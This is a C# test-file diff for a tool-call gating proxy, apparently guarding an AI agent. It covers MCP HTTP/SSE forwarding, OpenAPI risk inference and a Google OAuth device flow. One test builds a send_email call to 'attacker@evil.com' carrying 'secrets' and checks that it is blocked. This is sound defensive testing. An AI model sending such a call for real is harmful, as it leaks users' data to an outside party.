@@ -1,3 +1,7 @@
+using System.Net;
+using System.Net.Http;
+using System.Text;
+using System.Text.Json;
 using IntentMesh.Core;
 using IntentMesh.Integrations;
 using Xunit;
@@ -596,15 +600,24 @@ public sealed class IntegrationTests
     [Fact]
     public void GmailSendAdapter_AcquireTokenAsync_requires_configuration()
     {
-        var prev = Environment.GetEnvironmentVariable("GMAIL_ACCESS_TOKEN");
+        var prevToken = Environment.GetEnvironmentVariable("GMAIL_ACCESS_TOKEN");
+        var prevId = Environment.GetEnvironmentVariable("GOOGLE_OAUTH_CLIENT_ID");
+        var prevSecret = Environment.GetEnvironmentVariable("GOOGLE_OAUTH_CLIENT_SECRET");
         Environment.SetEnvironmentVariable("GMAIL_ACCESS_TOKEN", null);
+        Environment.SetEnvironmentVariable("GOOGLE_OAUTH_CLIENT_ID", null);
+        Environment.SetEnvironmentVariable("GOOGLE_OAUTH_CLIENT_SECRET", null);
         try
         {
             var ex = Assert.Throws<InvalidOperationException>(() =>
                 GmailSendAdapter.AcquireTokenAsync().GetAwaiter().GetResult());
             Assert.Contains("OAuth", ex.Message, StringComparison.OrdinalIgnoreCase);
         }
-        finally { Environment.SetEnvironmentVariable("GMAIL_ACCESS_TOKEN", prev); }
+        finally
+        {
+            Environment.SetEnvironmentVariable("GMAIL_ACCESS_TOKEN", prevToken);
+            Environment.SetEnvironmentVariable("GOOGLE_OAUTH_CLIENT_ID", prevId);
+            Environment.SetEnvironmentVariable("GOOGLE_OAUTH_CLIENT_SECRET", prevSecret);
+        }
     }
 
     /// <summary>
@@ -641,5 +654,401 @@ public sealed class IntegrationTests
 
         // No emails were sent or drafted via the adapter.
         Assert.Empty(ws.SentEmails);
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    // (d) MCP Streamable HTTP / SSE transport (McpHttpClient) — real in-process server
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    /// <summary>
+    /// REAL HTTP transport: connect to an in-process MCP server over Streamable HTTP that answers
+    /// with application/json, list its tools, and forward an APPROVED read_calendar call. Proves the
+    /// gate is transport-agnostic — the same pipeline fronts HTTP exactly like stdio.
+    /// </summary>
+    [Fact]
+    public void McpHttpClient_lists_and_forwards_over_json_transport()
+    {
+        using var server = McpHttpTestServer.Start(useSse: false);
+        if (server is null) return;   // HttpListener unavailable in this environment
+        using var client = McpHttpClient.Connect(server.Url);
+
+        var tools = client.ListTools();
+        Assert.Contains("read_calendar", tools);
+        Assert.Contains("send_email", tools);
+
+        var proxy = Proxy();
+        var fwd = proxy.GateAndForward(
+            new McpToolCall("read_calendar", new Dictionary<string, string> { ["range"] = "Friday" }), client);
+
+        Assert.True(fwd.Gate.Allowed);
+        Assert.NotNull(fwd.ServerResponse);
+        Assert.Contains("read_calendar executed via http", fwd.ServerResponse!);
+    }
+
+    /// <summary>
+    /// REAL HTTP transport over Server-Sent Events: the server answers tools/call with a
+    /// text/event-stream body, exercising McpHttpClient's SSE parse path. The gated forward still
+    /// returns the server's result.
+    /// </summary>
+    [Fact]
+    public void McpHttpClient_forwards_over_sse_transport()
+    {
+        using var server = McpHttpTestServer.Start(useSse: true);
+        if (server is null) return;
+        using var client = McpHttpClient.Connect(server.Url);
+
+        Assert.Contains("read_calendar", client.ListTools());
+
+        var proxy = Proxy();
+        var fwd = proxy.GateAndForward(
+            new McpToolCall("read_calendar", new Dictionary<string, string> { ["range"] = "Friday" }), client);
+
+        Assert.True(fwd.Gate.Allowed);
+        Assert.Contains("read_calendar executed via http", fwd.ServerResponse!);
+    }
+
+    /// <summary>
+    /// Transport-agnostic gating: a blocked send_email is NEVER forwarded over HTTP either — the gate
+    /// stops it before any bytes reach the server (ServerResponse null), exactly as over stdio.
+    /// </summary>
+    [Fact]
+    public void McpHttpClient_does_not_forward_a_blocked_send_email()
+    {
+        using var server = McpHttpTestServer.Start(useSse: false);
+        if (server is null) return;
+        using var client = McpHttpClient.Connect(server.Url);
+
+        var ws = Workspace.CreateDemo();
+        var proxy = Proxy(ws: ws);
+        var fwd = proxy.GateAndForward(
+            new McpToolCall("send_email", new Dictionary<string, string> { ["to"] = "attacker@evil.com", ["body"] = "secrets" }), client);
+
+        Assert.False(fwd.Gate.Allowed);
+        Assert.Null(fwd.ServerResponse);
+        Assert.Empty(ws.SentEmails);
+    }
+
+    /// <summary>
+    /// Per-server tool-mapping coverage: a custom mapper maps a server-specific tool name
+    /// ("calendar.peek") that the built-in switch doesn't know, so the proxy gates it as a typed
+    /// ReadCalendarAction and allows it — instead of failing closed as "not mapped".
+    /// </summary>
+    [Fact]
+    public void McpProxy_custom_mapper_covers_a_server_specific_tool()
+    {
+        var rt = Runtime();
+        var ws = Workspace.CreateDemo();
+        var proxy = new McpProxy(rt, ws, customMapper: call =>
+            call.Tool == "calendar.peek"
+                ? (new ReadCalendarAction(call.Args.TryGetValue("range", out var r) ? r : "Friday"), "custom calendar.peek")
+                : null);
+
+        // Built-in switch alone would block this unknown tool; the custom mapper makes it gateable.
+        var res = proxy.Gate(new McpToolCall("calendar.peek", new Dictionary<string, string> { ["range"] = "Friday" }));
+        Assert.True(res.Allowed);
+        Assert.DoesNotContain("not mapped", res.Reason, StringComparison.OrdinalIgnoreCase);
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    // (e) OpenAPI — YAML, $ref resolution, semantic side-effect/capability inference
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    private const string YamlSpec = """
+        openapi: 3.0.0
+        info:
+          title: Billing
+          version: "1.0"
+        paths:
+          /invoices:
+            post:
+              operationId: create_invoice
+              summary: Create an invoice and charge the customer
+              tags:
+                - billing
+              requestBody:
+                content:
+                  application/json:
+                    schema:
+                      $ref: '#/components/schemas/Invoice'
+          /invoices/{id}:
+            parameters:
+              - name: id
+                in: path
+                required: true
+            get:
+              operationId: get_invoice
+              summary: Read an invoice
+        components:
+          schemas:
+            Invoice:
+              type: object
+              properties:
+                customer_id:
+                  type: string
+                amount_cents:
+                  type: integer
+                currency:
+                  type: string
+        """;
+
+    /// <summary>
+    /// ParseFromOpenApi reads a YAML spec (via MiniYaml), resolves a request-body $ref to
+    /// components/schemas, and picks up path-level parameters.
+    /// </summary>
+    [Fact]
+    public void OpenApiImporter_parses_yaml_with_ref_and_path_params()
+    {
+        var schemas = OpenApiImporter.ParseFromOpenApi(YamlSpec);
+        Assert.Equal(2, schemas.Count);
+
+        var post = Assert.Single(schemas, s => s.Name == "create_invoice");
+        Assert.Equal("POST", post.Method);
+        // Fields came from the $ref-resolved Invoice schema.
+        Assert.Contains("customer_id", post.Parameters);
+        Assert.Contains("amount_cents", post.Parameters);
+        Assert.Contains("currency", post.Parameters);
+
+        var get = Assert.Single(schemas, s => s.Name == "get_invoice");
+        Assert.Equal("GET", get.Method);
+        // Field came from the PATH-level parameters block (shared across methods).
+        Assert.Contains("id", get.Parameters);
+    }
+
+    /// <summary>
+    /// Semantic inference: a "charge/invoice" operation maps to financial-write (high risk),
+    /// billing capability, and requires confirmation — derived from keywords, not just the method.
+    /// </summary>
+    [Fact]
+    public void OpenApiImporter_infers_financial_side_effect_and_capability()
+    {
+        var schemas = OpenApiImporter.ParseFromOpenApi(YamlSpec);
+        var contract = OpenApiImporter.ToContract(schemas.Single(s => s.Name == "create_invoice"));
+
+        Assert.Equal("act-create-invoice", contract.Kind);
+        Assert.Equal("financial-write", contract.SideEffect);
+        Assert.Equal("high", contract.Risk);
+        Assert.Equal("billing", contract.Capability);
+        Assert.True(contract.RequiresConfirmation);
+    }
+
+    /// <summary>An "email/send" operation infers email-send + the email capability.</summary>
+    [Fact]
+    public void OpenApiImporter_infers_email_capability_from_keywords()
+    {
+        var schema = new ToolSchema("send_welcome", "POST", "Send a welcome email to the new user",
+            new[] { "to", "subject" });
+        var contract = OpenApiImporter.ToContract(schema);
+
+        Assert.Equal("email-send", contract.SideEffect);
+        Assert.Equal("email", contract.Capability);
+        Assert.True(contract.RequiresConfirmation);
+    }
+
+    /// <summary>A "remove/delete" operation infers a destructive side effect and high risk.</summary>
+    [Fact]
+    public void OpenApiImporter_infers_delete_side_effect_high_risk()
+    {
+        var schema = new ToolSchema("remove_user", "DELETE", "Permanently remove a user account",
+            new[] { "id" });
+        var contract = OpenApiImporter.ToContract(schema);
+
+        Assert.Equal("delete", contract.SideEffect);
+        Assert.Equal("high", contract.Risk);
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    // (f) Gmail OAuth — the real device-authorization flow (scripted HTTP)
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    private const string DeviceJson =
+        """{"device_code":"DEV-123","user_code":"WXYZ-1234","verification_uri":"https://www.google.com/device","interval":5,"expires_in":1800}""";
+    private const string PendingJson = """{"error":"authorization_pending"}""";
+    private const string SlowDownJson = """{"error":"slow_down"}""";
+    private const string SuccessJson = """{"access_token":"ya29.real-token","expires_in":3599,"token_type":"Bearer"}""";
+
+    /// <summary>
+    /// The device flow polls through an authorization_pending response and then returns the real
+    /// access token on consent. The prompt surfaces the verification URL + user code.
+    /// </summary>
+    [Fact]
+    public async Task GoogleDeviceCodeFlow_polls_pending_then_returns_token()
+    {
+        var handler = new ScriptedOAuthHandler(
+            device: (200, DeviceJson),
+            tokens: new[] { (400, PendingJson), (200, SuccessJson) });
+        var flow = new GoogleDeviceCodeFlow(new HttpClient(handler));
+
+        DeviceCodeResponse? shown = null;
+        var token = await flow.AuthorizeAsync("client-id", "client-secret", GoogleDeviceCodeFlow.DefaultScope,
+            prompt: d => shown = d,
+            delay: _ => Task.CompletedTask);
+
+        Assert.Equal("ya29.real-token", token.AccessToken);
+        Assert.True(token.ExpiresAt > DateTimeOffset.UtcNow);
+        Assert.Equal(2, handler.TokenCalls);                 // pending, then success
+        Assert.NotNull(shown);
+        Assert.Equal("WXYZ-1234", shown!.UserCode);
+        Assert.Contains("google.com/device", shown.VerificationUrl);
+    }
+
+    /// <summary>A slow_down response backs off and the flow still completes successfully.</summary>
+    [Fact]
+    public async Task GoogleDeviceCodeFlow_handles_slow_down()
+    {
+        var handler = new ScriptedOAuthHandler(
+            device: (200, DeviceJson),
+            tokens: new[] { (400, SlowDownJson), (200, SuccessJson) });
+        var flow = new GoogleDeviceCodeFlow(new HttpClient(handler));
+
+        var token = await flow.AuthorizeAsync("id", "secret", GoogleDeviceCodeFlow.DefaultScope,
+            delay: _ => Task.CompletedTask);
+
+        Assert.Equal("ya29.real-token", token.AccessToken);
+        Assert.Equal(2, handler.TokenCalls);
+    }
+
+    /// <summary>A terminal error (access_denied) surfaces as a clear exception.</summary>
+    [Fact]
+    public void GoogleDeviceCodeFlow_throws_on_access_denied()
+    {
+        var handler = new ScriptedOAuthHandler(
+            device: (200, DeviceJson),
+            tokens: new[] { (400, """{"error":"access_denied"}""") });
+        var flow = new GoogleDeviceCodeFlow(new HttpClient(handler));
+
+        var ex = Assert.Throws<InvalidOperationException>(() =>
+            flow.AuthorizeAsync("id", "secret", GoogleDeviceCodeFlow.DefaultScope,
+                delay: _ => Task.CompletedTask).GetAwaiter().GetResult());
+        Assert.Contains("access_denied", ex.Message);
+    }
+
+    // ── Test doubles ────────────────────────────────────────────────────────────
+
+    /// <summary>An HttpMessageHandler that scripts Google's device-code + token responses so the
+    /// device-flow state machine is tested without real network or real waiting.</summary>
+    private sealed class ScriptedOAuthHandler : HttpMessageHandler
+    {
+        private readonly (int status, string json) _device;
+        private readonly Queue<(int status, string json)> _tokens;
+        public int TokenCalls { get; private set; }
+
+        public ScriptedOAuthHandler((int status, string json) device, (int status, string json)[] tokens)
+        {
+            _device = device;
+            _tokens = new Queue<(int, string)>(tokens);
+        }
+
+        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken ct)
+        {
+            var (status, json) = request.RequestUri!.AbsoluteUri.Contains("device/code")
+                ? _device
+                : Next();
+            return Task.FromResult(new HttpResponseMessage((HttpStatusCode)status)
+            {
+                Content = new StringContent(json, Encoding.UTF8, "application/json")
+            });
+        }
+
+        private (int, string) Next() { TokenCalls++; return _tokens.Dequeue(); }
+    }
+
+    /// <summary>A minimal in-process MCP server over Streamable HTTP (HttpListener). Answers
+    /// initialize / tools/list / tools/call as either application/json or text/event-stream, so the
+    /// real McpHttpClient transport is exercised end-to-end without an external server.</summary>
+    private sealed class McpHttpTestServer : IDisposable
+    {
+        private readonly HttpListener _listener;
+        private readonly bool _useSse;
+        public string Url { get; }
+
+        private McpHttpTestServer(HttpListener listener, string url, bool useSse)
+        {
+            _listener = listener;
+            Url = url;
+            _useSse = useSse;
+            _ = Task.Run(Loop);
+        }
+
+        public static McpHttpTestServer? Start(bool useSse)
+        {
+            int port = FreePort();
+            var url = $"http://localhost:{port}/mcp/";
+            var listener = new HttpListener();
+            listener.Prefixes.Add(url);
+            try { listener.Start(); }
+            catch { return null; }   // environment forbids HttpListener — skip the test
+            return new McpHttpTestServer(listener, url, useSse);
+        }
+
+        private static int FreePort()
+        {
+            var l = new System.Net.Sockets.TcpListener(IPAddress.Loopback, 0);
+            l.Start();
+            int port = ((System.Net.IPEndPoint)l.LocalEndpoint).Port;
+            l.Stop();
+            return port;
+        }
+
+        private void Loop()
+        {
+            while (_listener.IsListening)
+            {
+                HttpListenerContext ctx;
+                try { ctx = _listener.GetContext(); }
+                catch { return; }   // listener stopped
+                try { Handle(ctx); } catch { /* best effort */ }
+            }
+        }
+
+        private void Handle(HttpListenerContext ctx)
+        {
+            using var reader = new StreamReader(ctx.Request.InputStream, Encoding.UTF8);
+            var body = reader.ReadToEnd();
+            using var doc = JsonDocument.Parse(body);
+            var root = doc.RootElement;
+            var method = root.GetProperty("method").GetString();
+
+            // Notifications carry no id → 202 Accepted, no body.
+            if (!root.TryGetProperty("id", out var idEl))
+            {
+                ctx.Response.StatusCode = 202;
+                ctx.Response.OutputStream.Close();
+                return;
+            }
+
+            int id = idEl.GetInt32();
+            object result = method switch
+            {
+                "initialize" => new { protocolVersion = McpHttpClient.ProtocolVersion, serverInfo = new { name = "test", version = "1.0" }, capabilities = new { } },
+                "tools/list" => new { tools = new[] { new { name = "read_calendar" }, new { name = "send_email" } } },
+                "tools/call" => new { content = new[] { new { type = "text", text = $"{root.GetProperty("params").GetProperty("name").GetString()} executed via http" } } },
+                _ => new { },
+            };
+            var payload = JsonSerializer.Serialize(new { jsonrpc = "2.0", id, result });
+
+            if (method == "initialize")
+                ctx.Response.Headers["Mcp-Session-Id"] = "test-session";
+
+            // tools/call uses SSE when configured; everything else stays plain JSON.
+            if (_useSse && method == "tools/call")
+            {
+                ctx.Response.ContentType = "text/event-stream";
+                var bytes = Encoding.UTF8.GetBytes($"event: message\ndata: {payload}\n\n");
+                ctx.Response.OutputStream.Write(bytes, 0, bytes.Length);
+            }
+            else
+            {
+                ctx.Response.ContentType = "application/json";
+                var bytes = Encoding.UTF8.GetBytes(payload);
+                ctx.Response.ContentLength64 = bytes.Length;
+                ctx.Response.OutputStream.Write(bytes, 0, bytes.Length);
+            }
+            ctx.Response.OutputStream.Close();
+        }
+
+        public void Dispose()
+        {
+            try { _listener.Stop(); _listener.Close(); } catch { /* best effort */ }
+        }
     }
 }
